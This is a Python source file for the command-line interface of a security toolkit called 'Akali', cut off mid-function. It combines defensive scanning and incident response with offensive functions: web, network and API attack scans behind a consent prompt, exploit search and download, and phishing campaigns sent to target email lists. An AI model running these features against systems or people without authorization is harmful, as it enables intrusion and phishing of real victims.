"""Akali CLI interface logic."""

import sys
import time
from pathlib import Path
from typing import List, Optional, Dict
from ascii_art import (
    AKALI_COMPACT, TRAINING_BANNER, VAULT_BANNER,
    DLP_BANNER, HUNT_BANNER, INCIDENT_BANNER,
    print_banner, Colors
)

# Add project root and scanners to path
sys.path.insert(0, str(Path.home() / "akali"))
sys.path.append(str(Path.home() / "akali" / "offensive" / "scanners"))

# Import defensive scanners as package (preserves relative imports)
from defensive.scanners.secrets_scanner import SecretsScanner
from defensive.scanners.dependency_scanner import DependencyScanner
from defensive.scanners.sast_scanner import SASTScanner
from defensive.scanners.scanner_base import Finding
from data.findings_db import FindingsDB

# Offensive scanners (standalone imports work due to absolute import strategy)
from web_vuln_scanner import WebVulnScanner
from network_scanner import NetworkScanner
from api_scanner import APIScanner
from exploit_scanner import ExploitScanner

# Python-based fallback scanners (no external tools required)
from python_web_scanner import PythonWebScanner
from python_network_scanner import PythonNetworkScanner

# Incident response modules
from incident.incidents.incident_tracker import IncidentTracker
from incident.war_room.war_room_commander import WarRoomCommander
from incident.playbooks.playbook_engine import PlaybookEngine
from incident.incidents.post_mortem import PostMortemGenerator


class AkaliCLI:
    """Akali command-line interface."""

    def __init__(self):
        self.db = FindingsDB()
        self.scanners = {
            "secrets": SecretsScanner(),
            "dependencies": DependencyScanner(),
            "sast": SASTScanner()
        }
        self.offensive_scanners = {
            "web": WebVulnScanner(),
            "network": NetworkScanner(),
            "api": APIScanner(),
            "exploit": ExploitScanner()
        }
        # Python-based fallback scanners
        self.python_scanners = {
            "web": PythonWebScanner(),
            "network": PythonNetworkScanner()
        }
        # Incident response
        self.incident_tracker = IncidentTracker()
        self.war_room_commander = WarRoomCommander()
        self.playbook_engine = PlaybookEngine()
        self.post_mortem_generator = PostMortemGenerator()

    def scan(self, target: str, scanner_types: Optional[List[str]] = None) -> List[Finding]:
        """Run security scan on target."""
        if not scanner_types:
            scanner_types = list(self.scanners.keys())

        all_findings = []

        for scanner_type in scanner_types:
            if scanner_type not in self.scanners:
                print(f"⚠️  Unknown scanner: {scanner_type}")
                continue

            scanner = self.scanners[scanner_type]

            if not scanner.check_available():
                print(f"⚠️  Scanner '{scanner_type}' not available (tool not installed)")
                continue

            print(f"🔍 Running {scanner_type} scanner...")
            try:
                findings = scanner.scan(target)
                all_findings.extend(findings)

                if findings:
                    print(f"   Found {len(findings)} issues")
                    # Store in database
                    self.db.add_findings([f.to_dict() for f in findings])
                else:
                    print(f"   ✅ No issues found")

            except Exception as e:
                print(f"   ❌ Error: {e}")

        return all_findings

    def list_findings(
        self,
        status: Optional[str] = None,
        severity: Optional[str] = None,
        scanner: Optional[str] = None
    ):
        """List findings with optional filters."""
        findings = self.db.list_findings(status=status, severity=severity, scanner=scanner)

        if not findings:
            print("No findings match the filters.")
            return

        print(f"\n📋 Found {len(findings)} findings:\n")

        for finding in findings:
            severity_emoji = {
                "critical": "🔴",
                "high": "🟠",
                "medium": "🟡",
                "low": "🔵",
                "info": "⚪"
            }.get(finding.get("severity", "info"), "⚪")

            print(f"{severity_emoji} {finding['id']} - {finding['title']}")
            print(f"   Severity: {finding['severity'].upper()}")
            if finding.get("file"):
                location = f"{finding['file']}"
                if finding.get("line"):
                    location += f":{finding['line']}"
                print(f"   Location: {location}")
            print(f"   Status: {finding['status']}")
            print()

    def show_finding(self, finding_id: str):
        """Show detailed information about a finding."""
        finding = self.db.get_finding(finding_id)

        if not finding:
            print(f"❌ Finding not found: {finding_id}")
            return

        print(f"\n🔍 Finding: {finding['id']}\n")
        print(f"Title: {finding['title']}")
        print(f"Severity: {finding['severity'].upper()}")
        print(f"Type: {finding['type']}")
        print(f"Status: {finding['status']}")
        print(f"Timestamp: {finding['timestamp']}")

        if finding.get("file"):
            location = f"{finding['file']}"
            if finding.get("line"):
                location += f":{finding['line']}"
            print(f"Location: {location}")

        print(f"\nDescription:")
        print(f"  {finding['description']}")

        if finding.get("cvss"):
            print(f"\nCVSS: {finding['cvss']}")
        if finding.get("cwe"):
            print(f"CWE: {finding['cwe']}")
        if finding.get("owasp"):
            print(f"OWASP: {finding['owasp']}")

        if finding.get("fix"):
            print(f"\nRecommended Fix:")
            print(f"  {finding['fix']}")

        print()

    def show_stats(self):
        """Show database statistics."""
        stats = self.db.get_stats()

        print("\n📊 Akali Statistics\n")
        print(f"Total Findings: {stats['total']}")

        if stats['by_severity']:
            print("\nBy Severity:")
            for severity, count in sorted(stats['by_severity'].items()):
                print(f"  {severity}: {count}")

        if stats['by_status']:
            print("\nBy Status:")
            for status, count in sorted(stats['by_status'].items()):
                print(f"  {status}: {count}")

        if stats['by_scanner']:
            print("\nBy Scanner:")
            for scanner, count in sorted(stats['by_scanner'].items()):
                print(f"  {scanner}: {count}")

        print()

    def attack(self, target: str, attack_type: str = "full", quick: bool = False, **kwargs) -> List[Finding]:
        """Run offensive security scan on target.

        ⚠️  WARNING: Only use on systems you own or have explicit permission to test.

        Args:
            target: Target URL/hostname/IP
            attack_type: Type of attack scan (web, network, api, full)
            quick: Run quick scans only
            **kwargs: Additional scanner-specific arguments

        Returns:
            List of findings
        """
        print("\n⚠️  AUTHORIZATION CHECK")
        print("Offensive scanning requires explicit permission.")
        print("Only scan systems you own or have written authorization to test.")

        consent = input("\nDo you have authorization to scan this target? (yes/no): ")
        if consent.lower() != "yes":
            print("❌ Scan cancelled. Authorization required.")
            return []

        all_findings = []

        if attack_type in ["web", "full"]:
            print("\n🕷️  Running web vulnerability scan...")
            scanner = self.offensive_scanners["web"]
            if scanner.check_available():
                try:
                    findings = scanner.scan(target, quick=quick)
                    all_findings.extend(findings)
                    if findings:
                        self.db.add_findings([f.to_dict() for f in findings])
                except Exception as e:
                    print(f"   ❌ Web scan error: {e}")
            else:
                print("   ⚠️  External tools not available, using Python-based scanner...")
                python_scanner = self.python_scanners["web"]
                try:
                    findings = python_scanner.scan(target, quick=quick)
                    all_findings.extend(findings)
                    if findings:
                        self.db.add_findings([f.to_dict() for f in findings])
                except Exception as e:
                    print(f"   ❌ Python scanner error: {e}")

        if attack_type in ["network", "full"]:
            print("\n🌐 Running network scan...")
            scanner = self.offensive_scanners["network"]
            if scanner.check_available():
                try:
                    findings = scanner.scan(target, quick=quick, ports=kwargs.get("ports"))
                    all_findings.extend(findings)
                    if findings:
                        self.db.add_findings([f.to_dict() for f in findings])
                except Exception as e:
                    print(f"   ❌ Network scan error: {e}")
            else:
                print("   ⚠️  External tools not available, using Python-based scanner...")
                python_scanner = self.python_scanners["network"]
                try:
                    findings = python_scanner.scan(target, quick=quick, ports=kwargs.get("ports"))
                    all_findings.extend(findings)
                    if findings:
                        self.db.add_findings([f.to_dict() for f in findings])
                except Exception as e:
                    print(f"   ❌ Python scanner error: {e}")

        if attack_type in ["api", "full"]:
            print("\n🔌 Running API scan...")
            scanner = self.offensive_scanners["api"]
            if scanner.check_available():
                try:
                    findings = scanner.scan(target, wordlist=kwargs.get("wordlist"))
                    all_findings.extend(findings)
                    if findings:
                        self.db.add_findings([f.to_dict() for f in findings])
                except Exception as e:
                    print(f"   ❌ API scan error: {e}")
            else:
                print("   ⚠️  API scanner not available (tools not installed)")

        print(f"\n✅ Attack scan complete. Found {len(all_findings)} total findings.")

        # Print summary
        by_severity = {}
        for finding in all_findings:
            by_severity[finding.severity] = by_severity.get(finding.severity, 0) + 1

        if by_severity:
            print("\nFindings by severity:")
            for severity in ["critical", "high", "medium", "low", "info"]:
                count = by_severity.get(severity, 0)
                if count > 0:
                    print(f"  {severity.upper()}: {count}")

        return all_findings

    def exploit(self, cve_id: str):
        """Look up CVE and exploit information.

        Args:
            cve_id: CVE identifier (e.g., CVE-2021-44228)
        """
        scanner = self.offensive_scanners["exploit"]

        if not scanner.check_available():
            print("⚠️  Warning: NVD API not accessible. Results may be limited.")

        cve_info = scanner.lookup_cve(cve_id)

        if cve_info:
            scanner.print_cve_report(cve_info)
        else:
            print(f"❌ Failed to retrieve information for {cve_id}")

    # Phase 9A: Exploit Database Commands

    def exploit_search(self, query: str, source: str = "all", category: Optional[str] = None):
        """Search exploit databases.

        Args:
            query: Search query string
            source: Source to search (all, exploitdb, github, metasploit)
            category: Optional category filter
        """
        import sys
        sys.path.append(str(Path.home() / "akali"))
        from exploits.database.search import ExploitSearch

        searcher = ExploitSearch()

        print(f"\n🥷 Searching exploit databases for: {query}")
        if category:
            print(f"   Category filter: {category}\n")
        else:
            print()

        if source == "all":
            results = searcher.search_all(query)

            # Display results by source
            for source_name, source_results in results.items():
                if source_results:
                    print(f"\n📦 {source_name.upper()} ({len(source_results)} results):")
                    for exploit in source_results[:5]:
                        self._print_exploit_summary(exploit)
                    if len(source_results) > 5:
                        print(f"   ... and {len(source_results) - 5} more results\n")

            total = sum(len(r) for r in results.values())
            print(f"\n✅ Total: {total} exploits found across all sources")

        else:
            # Search specific source
            if source == "exploitdb":
                results = searcher.search_exploitdb(query)
            elif source == "github":
                results = searcher.search_github_pocs(query)
            elif source == "metasploit":
                results = searcher.search_metasploit(query)

            if results:
                print(f"\n📦 Found {len(results)} results:\n")
                for exploit in results:
                    self._print_exploit_summary(exploit)
            else:
                print("   No results found")

    def exploit_download(self, exploit_id: str, output_path: Optional[str] = None):
        """Download exploit by ID.

        Args:
            exploit_id: Exploit identifier (EDB-12345, GitHub URL, etc.)
            output_path: Optional output path
        """
        import sys
        sys.path.append(str(Path.home() / "akali"))
        from exploits.database.search import ExploitSearch

        searcher = ExploitSearch()

        # Set default output path
        if not output_path:
            # Extract filename from ID
            if exploit_id.startswith('EDB-'):
                output_path = f"exploit_{exploit_id}.txt"
            elif 'github.com' in exploit_id:
                filename = exploit_id.split('/')[-1]
                output_path = filename if filename else "exploit.txt"
            else:
                output_path = "exploit.txt"

        print(f"\n🥷 Downloading: {exploit_id}")
        print(f"   Output: {output_path}\n")

        success = searcher.download_exploit(exploit_id, output_path)

        if success:
            print(f"✅ Downloaded successfully to: {output_path}")
        else:
            print(f"❌ Failed to download exploit: {exploit_id}")
            print("   Check that the ID is correct and the source is available")

    def exploit_list(self, category: Optional[str] = None, platform: Optional[str] = None):
        """List available exploits.

        Args:
            category: Optional category filter
            platform: Optional platform filter
        """
        print("\n🥷 Listing exploit categories:\n")

        categories = {
            "webapp": "Web Application Exploits",
            "remote": "Remote Code Execution",
            "local": "Local Privilege Escalation",
            "dos": "Denial of Service",
            "windows": "Windows Exploits",
            "linux": "Linux Exploits",
            "mobile": "Mobile Application Exploits",
            "hardware": "Hardware/IoT Exploits"
        }

        if category:
            if category in categories:
                print(f"Category: {categories[category]}\n")
                print("Use 'akali exploit search <keywords> --category {category}' to search")
            else:
                print(f"❌ Unknown category: {category}")
                print("\nAvailable categories:")

        for cat, desc in categories.items():
            print(f"  {cat:12} - {desc}")

        print("\n💡 Tip: Use 'akali exploit search <query>' to search for specific exploits")

    def _print_exploit_summary(self, exploit: Dict):
        """Print exploit summary.

        Args:
            exploit: Exploit dictionary
        """
        title = exploit.get('title', exploit.get('name', 'Unknown'))
        exploit_id = exploit.get('id', 'N/A')
        source = exploit.get('source', 'unknown')

        print(f"  [{exploit_id}] {title}")

        if 'url' in exploit:
            print(f"      URL: {exploit['url']}")
        if 'stars' in exploit:
            print(f"      ⭐ {exploit['stars']} stars")
        if 'description' in exploit and exploit['description']:
            desc = exploit['description'][:80]
            print(f"      {desc}{'...' if len(exploit['description']) > 80 else ''}")
        if 'rank' in exploit:
            print(f"      Rank: {exploit['rank']}")

        print()

    def status(self):
        """Show Akali status and tool availability."""
        print_banner(AKALI_COMPACT, Colors.OKCYAN)
        print(f"{Colors.BOLD}Status Dashboard{Colors.ENDC}\n")

        print("Defensive Scanners:")
        for name, scanner in self.scanners.items():
            available = "✅" if scanner.check_available() else "❌"
            print(f"  {available} {name}")

        print("\nOffensive Scanners:")
        for name, scanner in self.offensive_scanners.items():
            if name == "exploit":
                # Exploit scanner is API-based, always "available"
                print(f"  ✅ {name} (CVE lookup)")
            else:
                available = "✅" if scanner.check_available() else "❌"
                print(f"  {available} {name}")

        print()
        self.show_stats()

    # Phase 3: Autonomous Operations

    def schedule_list(self):
        """List all scheduled jobs."""
        from autonomous.scheduler.cron_manager import CronManager
        from autonomous.scheduler.job_definitions import register_all_jobs

        manager = CronManager()
        register_all_jobs(manager)

        jobs = manager.list_jobs()
        if not jobs:
            print("No scheduled jobs.")
        else:
            print(f"\n📋 Scheduled Jobs ({len(jobs)}):\n")
            for job in jobs:
                status_emoji = "✅" if job["enabled"] else "❌"
                print(f"{status_emoji} {job['job_id']} - {job['name']}")
                print(f"   Schedule: {job['schedule']}")
                if job['next_run']:
                    print(f"   Next run: {job['next_run']}")
                if job['last_run']:
                    print(f"   Last run: {job['last_run']} ({job['last_status']})")
                print()

    def schedule_run(self, job_id: str):
        """Run a scheduled job immediately."""
        from autonomous.scheduler.cron_manager import CronManager
        from autonomous.scheduler.job_definitions import register_all_jobs

        manager = CronManager()
        register_all_jobs(manager)

        if manager.run_job(job_id, force=True):
            print(f"✅ Job {job_id} completed")
        else:
            print(f"❌ Job {job_id} failed")

    def daemon_start(self, daemon_type: str):
        """Start a daemon."""
        import subprocess

        daemon_map = {
            "watch": "autonomous/daemons/watch_daemon.py",
            "health": "autonomous/daemons/health_daemon.py"
        }

        if daemon_type not in daemon_map:
            print(f"❌ Unknown daemon type: {daemon_type}")
            print(f"   Available: {', '.join(daemon_map.keys())}")
            return

        daemon_path = Path.home() / "akali" / daemon_map[daemon_type]
        result = subprocess.run(["python3", str(daemon_path), "start"], capture_output=True, text=True)

        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr)

    def daemon_stop(self, daemon_type: str):
        """Stop a daemon."""
        import subprocess

        daemon_map = {
            "watch": "autonomous/daemons/watch_daemon.py",
            "health": "autonomous/daemons/health_daemon.py"
        }

        if daemon_type not in daemon_map:
            print(f"❌ Unknown daemon type: {daemon_type}")
            return

        daemon_path = Path.home() / "akali" / daemon_map[daemon_type]
        result = subprocess.run(["python3", str(daemon_path), "stop"], capture_output=True, text=True)

        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr)

    def daemon_status(self):
        """Show daemon status."""
        import subprocess

        daemons = {
            "watch": "autonomous/daemons/watch_daemon.py",
            "health": "autonomous/daemons/health_daemon.py"
        }

        print("\n🥷 Daemon Status\n")

        for name, path in daemons.items():
            daemon_path = Path.home() / "akali" / path
            result = subprocess.run(["python3", str(daemon_path), "status"], capture_output=True, text=True)
            print(f"{name}: {result.stdout.strip()}")

    def alert_send(self, finding_id: str, agent_id: str = None):
        """Send alert for a finding."""
        from autonomous.alerts.alert_manager import AlertManager

        manager = AlertManager()
        alert_id = manager.send_alert(finding_id, force_agent=agent_id)

        if alert_id:
            print(f"✅ Alert sent: {alert_id}")
        else:
            print(f"❌ Failed to send alert for finding: {finding_id}")

    def alert_list(self, pending: bool = False):
        """List alerts."""
        from autonomous.alerts.alert_manager import AlertManager

        manager = AlertManager()
        status = "pending" if pending else None
        alerts = manager.list_alerts(status=status)

        if not alerts:
            print("No alerts.")
        else:
            print(f"\n📋 Alerts ({len(alerts)}):\n")
            for alert in alerts:
                status_emoji = {"pending": "⏳", "sent": "✅", "failed": "❌"}.get(alert["status"], "❓")
                print(f"{status_emoji} {alert['alert_id']}")
                print(f"   Finding: {alert['finding_id']}")
                print(f"   Severity: {alert['severity']}")
                print(f"   Agent: {alert['agent_id']}")
                print(f"   Status: {alert['status']}")
                print()

    def alert_ack(self, alert_id: str):
        """Acknowledge an alert."""
        from autonomous.alerts.alert_manager import AlertManager

        manager = AlertManager()
        if manager.ack_alert(alert_id):
            print(f"✅ Alert acknowledged: {alert_id}")
        else:
            print(f"❌ Alert not found: {alert_id}")

    def triage_finding(self, finding_id: str):
        """Triage a finding."""
        from autonomous.triage.triage_engine import TriageEngine

        engine = TriageEngine()
        result = engine.triage_finding(finding_id)

        if result:
            print(f"\n📊 Triage Result for {finding_id}:\n")
            print(f"  Risk Score: {result['risk_score']}")
            print(f"  Adjusted Severity: {result['adjusted_severity']}")
            print(f"  Is False Positive: {result['is_false_positive']}")
            if result.get('false_positive_reason'):
                print(f"  FP Reason: {result['false_positive_reason']}")
            if result.get('auto_fix_available'):
                print(f"  Auto-Fix: {result['auto_fix_command']}")
        else:
            print(f"❌ Finding not found: {finding_id}")

    # Phase 4: Intelligence & Metrics

    def intel_cve_check(self, hours: int = 24):
        """Check for new CVEs."""
        import subprocess
        script = Path.home() / "akali" / "intelligence" / "cve_monitor" / "cve_tracker.py"
        subprocess.run(["python3", str(script), "check", str(hours)])

    def intel_cve_lookup(self, cve_id: str):
        """Lookup specific CVE."""
        import subprocess
        script = Path.home() / "akali" / "intelligence" / "cve_monitor" / "cve_tracker.py"
        subprocess.run(["python3", str(script), "lookup", cve_id])

    def intel_scan_deps(self):
        """Scan all projects for dependencies."""
        import subprocess
        script = Path.home() / "akali" / "intelligence" / "cve_monitor" / "dependency_mapper.py"
        subprocess.run(["python3", str(script), "scan"])

    def intel_impact(self, cve_id: str):
        """Analyze CVE impact on family projects."""
        import subprocess
        script = Path.home() / "akali" / "intelligence" / "cve_monitor" / "impact_analyzer.py"
        subprocess.run(["python3", str(script), "cve", cve_id])

    def intel_threat_feed(self):
        """Show threat intelligence feed."""
        import subprocess
        script = Path.home() / "akali" / "intelligence" / "threat_hub" / "feed_aggregator.py"
        subprocess.run(["python3", str(script), "fetch"])

    def intel_breach_check(self, email: str):
        """Check if email appears in breaches."""
        import subprocess
        script = Path.home() / "akali" / "intelligence" / "threat_hub" / "breach_monitor.py"
        subprocess.run(["python3", str(script), "email", email])

    def metrics_score(self):
        """Show security scorecard."""
        import subprocess
        script = Path.home() / "akali" / "metrics" / "scorecard" / "score_calculator.py"
        subprocess.run(["python3", str(script)])

    def metrics_history(self, days: int = 30):
        """Show score history."""
        import subprocess
        script = Path.home() / "akali" / "metrics" / "scorecard" / "score_calculator.py"
        subprocess.run(["python3", str(script), "history", str(days)])

    def metrics_observatory(self):
        """Show MTTD/MTTR metrics."""
        import subprocess
        script = Path.home() / "akali" / "metrics" / "observatory" / "mttd_mttr_tracker.py"
        subprocess.run(["python3", str(script)])

    def dashboard_start(self, host: str = "127.0.0.1", port: int = 8765):
        """Start web dashboard."""
        import subprocess
        script = Path.home() / "akali" / "metrics" / "dashboard" / "server.py"
        print(f"\n🥷 Starting Akali Dashboard on {host}:{port}...")
        print(f"   Open your browser to: http://{host}:{port}\n")
        subprocess.run(["python3", str(script)])

    def dashboard_status(self):
        """Check if dashboard is running."""
        import socket
        port = 8765
        host = "127.0.0.1"

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            print(f"✅ Dashboard is running at http://{host}:{port}")
        else:
            print(f"❌ Dashboard is not running")
            print(f"   Start with: akali dashboard start")

    # ========== Incident Response Commands ==========

    def incident_create(self, title: str, severity: str, description: Optional[str] = None,
                       incident_type: Optional[str] = None, systems: Optional[List[str]] = None):
        """Create a new incident."""
        incident = self.incident_tracker.create_incident(
            title=title,
            severity=severity,
            description=description,
            incident_type=incident_type,
            affected_systems=systems
        )
        print(f"\n🚨 Incident created: {incident['id']}")
        print(f"   Title: {incident['title']}")
        print(f"   Severity: {incident['severity'].upper()}")
        print(f"   Status: {incident['status']}")

    def incident_list(self, status: Optional[str] = None, severity: Optional[str] = None):
        """List incidents."""
        print_banner(INCIDENT_BANNER, Colors.FAIL)

        incidents = self.incident_tracker.list_incidents(status=status, severity=severity)

        if not incidents:
            print("No incidents found")
            return

        print(f"{Colors.BOLD}Found {len(incidents)} incidents{Colors.ENDC}\n")
        for inc in incidents:
            severity_emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢'}.get(inc['severity'], '⚪')
            status_emoji = {'new': '🆕', 'active': '⚡', 'contained': '🛡️', 'resolved': '✅', 'closed': '🔒'}.get(inc['status'], '•')

            print(f"{severity_emoji} {status_emoji} {inc['id']}: {inc['title']}")
            print(f"         {inc['severity'].upper()} | {inc['status']}")
            print()

    def incident_show(self, incident_id: str):
        """Show incident details."""
        report = self.incident_tracker.get_full_incident_report(incident_id)
        if not report:
            print(f"Incident not found: {incident_id}")
            return

        inc = report['incident']
        print(f"\n🚨 {inc['id']}: {inc['title']}")
        print(f"   Severity: {inc['severity'].upper()}")
        print(f"   Status: {inc['status']}")
        print(f"   Created: {inc['created_at']}")

        if inc['description']:
            print(f"   Description: {inc['description']}")

        print(f"\n   Timeline events: {len(report['timeline'])}")
        print(f"   Evidence items: {len(report['evidence'])}")
        print(f"   Actions: {len(report['actions'])}")

    def incident_update(self, incident_id: str, status: str):
        """Update incident status."""
        incident = self.incident_tracker.update_status(incident_id, status, actor='akali-cli')
        if incident:
            print(f"✅ {incident_id} status updated to: {status}")
        else:
            print(f"❌ Failed to update incident")

    def incident_close(self, incident_id: str, resolution: str):
        """Close an incident."""
        incident = self.incident_tracker.close_incident(incident_id, resolution, actor='akali-cli')
        if incident:
            print(f"✅ {incident_id} closed")
        else:
            print(f"❌ Failed to close incident")

    def war_room_start(self, incident_id: str):
        """Activate war room for an incident."""
        state = self.war_room_commander.activate_war_room(incident_id, notify_team=True)
        print(f"\n🚨 WAR ROOM ACTIVATED")
        print(f"   Incident: {incident_id}")
        print(f"   Team notified: ✅")
        print(f"   Status: http://localhost:8765/incidents/{incident_id}")

    def war_room_stop(self, resolution: Optional[str] = None):
        """Deactivate war room."""
        success = self.war_room_commander.deactivate_war_room(resolution, notify_team=True)
        if success:
            print(f"✅ War room deactivated")
        else:
            print(f"❌ No active war room")

    def war_room_status(self):
        """Show war room status."""
        status = self.war_room_commander.get_status()
        if not status:
            print("No active war room")
            return

        inc = status['incident']
        print(f"\n🚨 ACTIVE WAR ROOM")
        print(f"   Incident: {inc['id']} - {inc['title']}")
        print(f"   Severity: {inc['severity'].upper()}")
        print(f"   Status: {inc['status']}")
        print(f"   Duration: {status['duration']}")
        print(f"   Timeline events: {len(status['timeline'])}")

    def playbook_list(self):
        """List available playbooks."""
        playbooks = self.playbook_engine.list_playbooks()

        if not playbooks:
            print("No playbooks found")
            return

        print(f"\n📋 Available Playbooks:\n")
        for pb in playbooks:
            severity_emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢'}.get(pb['severity'], '⚪')
            print(f"{severity_emoji} {pb['id']}")
            print(f"   {pb['name']}")
            print(f"   {pb['description']}")
            print()

    def playbook_run(self, playbook_id: str, incident_id: str):
        """Run a playbook for an incident."""
        run_id = self.playbook_engine.start_playbook(playbook_id, incident_id, auto_execute=False)
        print(f"\n📋 Playbook started: {run_id}")
        print(f"   Playbook: {playbook_id}")
        print(f"   Incident: {incident_id}")

        # Show first step
        step = self.playbook_engine.get_current_step(run_id)
        if step:
            print(f"\n   Current step: {step['name']}")
            print(f"   {step['description']}")
            print(f"\n   Execute with: akali playbook step {run_id} {step['id']}")

    def playbook_status(self, run_id: str):
        """Check playbook execution status."""
        status = self.playbook_engine.get_run_status(run_id)
        if not status:
            print(f"Playbook run not found: {run_id}")
            return

        print(f"\n📋 Playbook Run: {run_id}")
        print(f"   Playbook: {status['playbook_name']}")
        print(f"   Incident: {status['incident_id']}")
        print(f"   Status: {status['status']}")
        print(f"   Progress: {status['current_step']}/{status['total_steps']}")

        if status['status'] == 'running':
            step = self.playbook_engine.get_current_step(run_id)
            if step:
                print(f"\n   Current step: {step['name']}")

    def post_mortem(self, incident_id: str, output: Optional[str] = None):
        """Generate post-mortem report."""
        report_path = self.post_mortem_generator.generate_report(incident_id, output)
        print(f"\n✅ Post-mortem report generated:")
        print(f"   {report_path}")

    # Phase 6: Training

    def train_list(self):
        """List available training modules."""
        from education.training.training_engine import TrainingEngine

        engine = TrainingEngine()
        modules = engine.list_modules()

        print_banner(TRAINING_BANNER, Colors.OKGREEN)
        print(f"{Colors.BOLD}Available Training Modules{Colors.ENDC}\n")
        for i, module in enumerate(modules, 1):
            difficulty_emoji = {'beginner': '🟢', 'intermediate': '🟡', 'advanced': '🔴'}.get(module['difficulty'], '⚪')
            print(f"{i}. {module['title']}")
            print(f"   {module['description']}")
            print(f"   {difficulty_emoji} {module['difficulty'].title()} | ⏱️  {module['estimated_time']}")
            if module.get('tags'):
                print(f"   🏷️  {', '.join(module['tags'])}")
            print()

    def train_start(self, module_id: str, agent_id: str = "unknown"):
        """Start training module."""
        from education.training.training_engine import TrainingEngine
        from education.training.progress_tracker import ProgressTracker
        from education.training.certificate_generator import CertificateGenerator

        engine = TrainingEngine()
        module = engine.get_module(module_id)

        if not module:
            print(f"❌ Module not found: {module_id}")
            print("\nAvailable modules:")
            for m in engine.list_modules():
                print(f"  • {m['id']}")
            return

        # Run training
        results = engine.start_training(module_id, agent_id)

        if 'error' in results:
            print(f"\n❌ Error: {results['error']}")
            return

        # Save progress
        tracker = ProgressTracker()
        session_id = tracker.record_session(results)

        print(f"\n📊 Session recorded: #{session_id}")

        # Generate certificate if passed
        if results['passed']:
            try:
                generator = CertificateGenerator()
                cert_path = generator.generate_certificate(
                    agent_id=results['agent_id'],
                    module_title=module.title,
                    module_id=results['module_id'],
                    score=results['score'],
                    total_questions=results['total_questions'],
                    percentage=results['percentage']
                )
                tracker.mark_certificate_issued(
                    results['agent_id'],
                    results['module_id'],
                    cert_path
                )
                print(f"\n🏆 Certificate generated: {cert_path}")
            except ImportError:
                print("\n⚠️  Certificate generation requires reportlab: pip install reportlab")

    def train_progress(self, agent_id: str = "unknown"):
        """View training progress for an agent."""
        from education.training.progress_tracker import ProgressTracker

        tracker = ProgressTracker()
        progress = tracker.get_agent_progress(agent_id)

        if not progress['modules']:
            print(f"\n📊 No training history for {agent_id}")
            return

        stats = progress['stats']

        print(f"\n📊 Training Progress for {agent_id}:\n")
        print(f"   Modules Started: {stats['total_modules']}")
        print(f"   Modules Completed: {stats['completed_modules']} ({stats['completion_rate']:.1f}%)")
        print(f"   Total Attempts: {stats['total_attempts']}")
        print(f"   Average Score: {stats['average_score']:.1f}%")
        print(f"   Certificates Earned: {stats['certificates_earned']}")

        if progress['modules']:
            print(f"\n📚 Module Progress:\n")
            for module in progress['modules']:
                status = "✅" if module['completed'] else "📝"
                print(f"{status} {module['module_id']}")
                print(f"   Attempts: {module['attempts']}")
                print(f"   Best Score: {module['best_score']} ({module['best_percentage']:.1f}%)")
                print()

    def train_certificate(self, agent_id: str, module_id: Optional[str] = None):
        """View or regenerate certificates."""
        from education.training.progress_tracker import ProgressTracker

        tracker = ProgressTracker()

        if module_id:
            # Check if certificate exists
            certs = tracker.get_certificates(agent_id)
            cert = next((c for c in certs if c['module_id'] == module_id), None)

            if cert:
                print(f"\n🏆 Certificate for {module_id}:")
                print(f"   Issued: {cert['issued_at']}")
                print(f"   Path: {cert['certificate_path']}")
            else:
                print(f"\n❌ No certificate found for {agent_id} / {module_id}")
        else:
            # List all certificates
            certs = tracker.get_certificates(agent_id)

            if not certs:
                print(f"\n🏆 No certificates earned yet for {agent_id}")
                return

            print(f"\n🏆 Certificates for {agent_id}:\n")
            for cert in certs:
                print(f"   {cert['module_id']}")
                print(f"   Issued: {cert['issued_at']}")
                print(f"   Path: {cert['certificate_path']}")
                print()

    # Phase 6: Phishing Simulation

    def phish_list_templates(self):
        """List available phishing templates."""
        from education.phishing.campaign_manager import CampaignManager

        manager = CampaignManager()
        templates = manager.list_templates()

        print("\n📧 Akali Phishing Templates:\n")
        for template in templates:
            difficulty_emoji = {'low': '🟢', 'medium': '🟡', 'high': '🔴'}.get(template['difficulty'], '⚪')
            print(f"{difficulty_emoji} {template['id']}")
            print(f"   {template['name']}")
            print(f"   Category: {template['category']} | Difficulty: {template['difficulty']}")
            print(f"   {template['description']}")
            print()

        print(f"Total templates: {len(templates)}")

    def phish_create_campaign(self, name: str, template_id: str, targets_file: str,
                               description: Optional[str] = None):
        """Create a new phishing campaign."""
        from education.phishing.campaign_manager import CampaignManager
        import json

        manager = CampaignManager()

        # Load targets from JSON file
        try:
            with open(targets_file, 'r') as f:
                targets = json.load(f)
        except Exception as e:
            print(f"❌ Failed to load targets file: {e}")
            return

        # Validate targets format
        if not isinstance(targets, list):
            print("❌ Targets file must contain a JSON array")
            return

        for target in targets:
            if 'email' not in target:
                print(f"❌ Target missing 'email' field: {target}")
                return

        # Create campaign
        try:
            campaign_id = manager.create_campaign(
                name=name,
                template_id=template_id,
                targets=targets,
                description=description
            )
            print(f"\n✅ Campaign created: {campaign_id}")
            print(f"   Name: {name}")
            print(f"   Template: {template_id}")
            print(f"   Targets: {len(targets)}")
            print(f"\nNext steps:")
            print(f"  1. Start tracking server: akali phish start-tracker")
            print(f"  2. Send emails: akali phish send {campaign_id}")
        except Exception as e:
            print(f"❌ Failed to create campaign: {e}")

    def phish_list_campaigns(self, status: Optional[str] = None):
        """List phishing campaigns."""
        from education.phishing.campaign_manager import CampaignManager

        manager = CampaignManager()
        campaigns = manager.list_campaigns(status=status)

        if not campaigns:
            print("No campaigns found")
            return

        print(f"\n📋 Phishing Campaigns ({len(campaigns)}):\n")
        for campaign in campaigns:
            status_emoji = {
                'draft': '📝',
                'scheduled': '📅',
                'active': '⚡',
                'paused': '⏸️',
                'completed': '✅',
                'cancelled': '❌'
            }.get(campaign.status, '•')

            print(f"{status_emoji} {campaign.id}: {campaign.name}")
            print(f"   Template: {campaign.template_id}")
            print(f"   Status: {campaign.status}")
            print(f"   Created: {campaign.created_at}")
            print()

    def phish_send(self, campaign_id: str, dry_run: bool = False):
        """Send campaign emails."""
        from education.phishing.campaign_manager import CampaignManager
        from education.phishing.email_sender import EmailSender

        manager = CampaignManager()
        campaign = manager.get_campaign(campaign_id)

        if not campaign:
            print(f"❌ Campaign not found: {campaign_id}")
            return

